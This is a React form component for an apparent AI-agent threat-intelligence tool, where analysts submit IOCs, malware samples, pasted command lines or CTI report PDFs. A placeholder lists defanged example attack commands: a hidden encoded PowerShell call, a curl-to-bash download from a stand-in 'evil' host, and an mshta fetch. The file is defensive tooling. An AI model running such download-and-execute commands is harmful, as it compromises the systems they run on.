import React from 'react'
import { parseSeedInput } from '../lib/ioc.js'

export default function NewInvestigationForm({ form, settings, allowedModels }) {
  const {
    seedText, setSeedText, inputMode, setInputMode, batchCombined, setBatchCombined,
    pdfFile, setPdfFile, pdfBusy, pdfError, setPdfError, pdfFileInputRef,
    sampleFile, setSampleFile, sampleText, setSampleText, sampleBusy, sampleError, setSampleError,
    sampleFileInputRef, start, startFromPdf, startFromSample,
  } = form
  const { model, setModel, effort, setEffort, vertical, setVertical, verticals, verticalPinned } = settings
  return (
    <>
      <div className="section-label">New investigation</div>
      {/* Segmented control:
          - IOC: paste one or many indicators (auto-detected, auto-batched).
          - Sample: upload an executable / dropper / archive OR paste a
            command line / script — the agent hashes the binary, extracts
            embedded IOCs, and reads the raw text as context.
          - PDF: upload an existing CTI report and let the agent read it. */}
      <div className="seg-control seg-control-3" role="tablist" aria-label="Investigation mode">
        <button
          type="button"
          role="tab"
          aria-selected={inputMode === 'ioc'}
          className={`seg-option${inputMode === 'ioc' ? ' active' : ''}`}
          onClick={() => setInputMode('ioc')}
          title="Paste a single IOC or a list — type is auto-detected"
        >
          <span className="seg-icon" aria-hidden="true">◆</span>
          IOC
        </button>
        <button
          type="button"
          role="tab"
          aria-selected={inputMode === 'sample'}
          className={`seg-option${inputMode === 'sample' ? ' active' : ''}`}
          onClick={() => setInputMode('sample')}
          title="Upload a malware sample / dropper / archive, or paste a malicious command line"
        >
          <span className="seg-icon" aria-hidden="true">⚙</span>
          Sample
        </button>
        <button
          type="button"
          role="tab"
          aria-selected={inputMode === 'pdf'}
          className={`seg-option${inputMode === 'pdf' ? ' active' : ''}`}
          onClick={() => setInputMode('pdf')}
          title="Upload an existing CTI report — extracts IOCs and feeds the report text to the agent"
        >
          <span className="seg-icon" aria-hidden="true">📄</span>
          PDF
        </button>
      </div>
      {inputMode === 'ioc' && (() => {
        const parsed = parseSeedInput(seedText)
        const multi = parsed.length > 1
        return (
          <>
            <textarea
              className="batch-textarea"
              value={seedText}
              onChange={e => setSeedText(e.target.value)}
              onKeyDown={e => {
                // Single-line input → Enter submits. Multi-line → keep newline
                // for additional IOCs; submit on Cmd/Ctrl+Enter.
                if (e.key === 'Enter' && !e.shiftKey && (!seedText.includes('\n') || e.metaKey || e.ctrlKey)) {
                  e.preventDefault()
                  start()
                }
              }}
              placeholder={`Paste one IOC, or a list (defanged ok — one per line or comma-separated):\nexample.com\n1.2.3.4\nhxxps://evil[.]com/path`}
              rows={3}
            />
            {multi && (
              <div className="batch-switch" title="Separate: one investigation per IOC. Combined: all IOCs on one graph to find cross-links.">
                <span className={`batch-switch-label${!batchCombined ? ' active' : ''}`}>Separate</span>
                <button
                  type="button"
                  className={`switch-track${batchCombined ? ' on' : ''}`}
                  onClick={() => setBatchCombined(v => !v)}
                  aria-label="Toggle combined mode"
                >
                  <span className="switch-thumb" />
                </button>
                <span className={`batch-switch-label${batchCombined ? ' active' : ''}`}>Combined</span>
              </div>
            )}
          </>
        )
      })()}
      {inputMode === 'pdf' && (
        <div className="pdf-dropzone">
          <input
            ref={pdfFileInputRef}
            id="pdf-file-input"
            type="file"
            accept="application/pdf,.pdf"
            onChange={e => { setPdfFile(e.target.files?.[0] || null); setPdfError('') }}
            hidden
          />
          <label htmlFor="pdf-file-input" className="pdf-drop-target">
            {pdfFile ? (
              <>
                <span className="pdf-drop-icon" aria-hidden="true">📄</span>
                <span className="pdf-drop-name" title={pdfFile.name}>
                  {pdfFile.name.length > 38 ? pdfFile.name.slice(0, 36) + '…' : pdfFile.name}
                </span>
                <span className="pdf-drop-meta">
                  {(pdfFile.size / 1024).toFixed(1)} KB · cliquer pour changer
                </span>
              </>
            ) : (
              <>
                <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
                <span className="pdf-drop-name">Choisir un PDF de rapport CTI</span>
                <span className="pdf-drop-meta">Le texte est lu par l'agent (max 25 MB)</span>
              </>
            )}
          </label>
          {pdfError && <div className="pdf-error">{pdfError}</div>}
        </div>
      )}
      {inputMode === 'sample' && (
        <div className="sample-pane">
          <input
            ref={sampleFileInputRef}
            id="sample-file-input"
            type="file"
            onChange={e => {
              setSampleFile(e.target.files?.[0] || null)
              setSampleError('')
            }}
            hidden
          />
          <label htmlFor="sample-file-input" className="pdf-drop-target">
            {sampleFile ? (
              <>
                <span className="pdf-drop-icon" aria-hidden="true">⚙</span>
                <span className="pdf-drop-name" title={sampleFile.name}>
                  {sampleFile.name.length > 38 ? sampleFile.name.slice(0, 36) + '…' : sampleFile.name}
                </span>
                <span className="pdf-drop-meta">
                  {(sampleFile.size / 1024).toFixed(1)} KB · click to replace
                </span>
              </>
            ) : (
              <>
                <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
                <span className="pdf-drop-name">Drop an executable / dropper / archive</span>
                <span className="pdf-drop-meta">Hashed locally — file is not stored (max 25 MB)</span>
              </>
            )}
          </label>
          <div className="sample-or">or paste a command line / script</div>
          <textarea
            className="batch-textarea"
            value={sampleText}
            onChange={e => setSampleText(e.target.value)}
            placeholder={'powershell -nop -w hidden -enc <base64>\ncurl http://evil[.]tld/x.sh | bash\nmshta hxxps://bad[.]site/p.hta'}
            rows={4}
            disabled={!!sampleFile}
            title={sampleFile ? 'Clear the file selection to paste a command' : ''}
          />
          {sampleError && <div className="pdf-error">{sampleError}</div>}
        </div>
      )}
      {verticalPinned ? (
        <>
          <div className="section-label">Vertical</div>
          <div className="vertical-pinned" title="Set by this subdomain (cti./osint./dd.)">
            {(verticals.find(v => v.name === vertical) || {}).label || vertical.toUpperCase()}
            <span className="vertical-pinned-hint"> · from subdomain</span>
          </div>
        </>
      ) : verticals.length > 1 && (
        <>
          <label className="section-label" htmlFor="new-inv-vertical">Vertical</label>
          <select id="new-inv-vertical" value={vertical} onChange={e => setVertical(e.target.value)}
                  title="Investigation lens. CTI = threat-infrastructure attribution. OSINT = identity / entity footprint correlation. DD = company / KYB due diligence.">
            {verticals.map(v => <option key={v.name} value={v.name}>{v.label}</option>)}
          </select>
        </>
      )}
      <label className="section-label" htmlFor="new-inv-model">Model</label>
      <select id="new-inv-model" value={model} onChange={e => setModel(e.target.value)}>
        {(!allowedModels || allowedModels.includes('sonnet')) && <option value="sonnet">Sonnet (current: 5.5 — recommended)</option>}
        {(!allowedModels || allowedModels.includes('opus')) && <option value="opus">Opus (current: 5 — smarter, slower)</option>}
        {(!allowedModels || allowedModels.includes('haiku')) && <option value="haiku">Haiku (current: 5.5 — faster, lighter)</option>}
        {(!allowedModels || allowedModels.includes('sonnet-5')) && <option value="sonnet-5">Sonnet 5</option>}
        {(!allowedModels || allowedModels.includes('opus-5')) && <option value="opus-5">Opus 5</option>}
        {(!allowedModels || allowedModels.includes('fable-5')) && <option value="fable-5">Fable 5 (top tier — may refuse malware-heavy work)</option>}
        {(!allowedModels || allowedModels.includes('opus-4.8')) && <option value="opus-4.8">Opus 4.8</option>}
        {(!allowedModels || allowedModels.includes('opus-4.7')) && <option value="opus-4.7">Opus 4.7</option>}
      </select>
      <label className="section-label" htmlFor="new-inv-effort">Thinking effort</label>
      <select id="new-inv-effort" value={effort} onChange={e => setEffort(e.target.value)}
              title="Extended-thinking budget for the agent. Higher = deeper reasoning, slower & more quota. 'Default' lets the model decide.">
        <option value="">Default (model decides)</option>
        <option value="low">Low — fast, shallow</option>
        <option value="medium">Medium</option>
        <option value="high">High</option>
        <option value="xhigh">Extra high</option>
        <option value="max">Max — deepest, slowest</option>
      </select>
      <button
        onClick={
          inputMode === 'pdf'    ? startFromPdf
          : inputMode === 'sample' ? startFromSample
          : start
        }
        disabled={
          (inputMode === 'pdf' && (pdfBusy || !pdfFile)) ||
          (inputMode === 'sample' && (sampleBusy || (!sampleFile && !sampleText.trim()))) ||
          (inputMode === 'ioc' && parseSeedInput(seedText).length === 0)
        }
      >
        {inputMode === 'pdf'
          ? (pdfBusy ? 'Analyse du PDF…' : 'Importer le rapport →')
          : inputMode === 'sample'
          ? (sampleBusy ? 'Hashing & extracting…' : (sampleFile ? 'Submit sample →' : 'Investigate command →'))
          : (() => {
              const n = parseSeedInput(seedText).length
              if (n <= 1) return 'Investigate →'
              return `Launch ${n} IOC${n > 1 ? 's' : ''} →`
            })()}
      </button>
    </>
  )
}
